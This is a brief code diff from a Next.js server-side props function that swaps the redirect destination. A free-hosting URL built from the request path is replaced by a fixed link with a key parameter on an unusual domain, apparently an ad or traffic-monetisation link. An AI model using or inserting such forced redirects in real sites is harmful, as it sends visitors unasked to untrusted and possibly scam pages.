@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://vairalhubgirlahd.000webhostapp.com/` + encodeURI(path as string)
+					`https://overloadmaturespanner.com/pfhnq51g8?key=29116f19f1a20c864e8eaefd6786614a` 
 				}`,
 			},
 		};
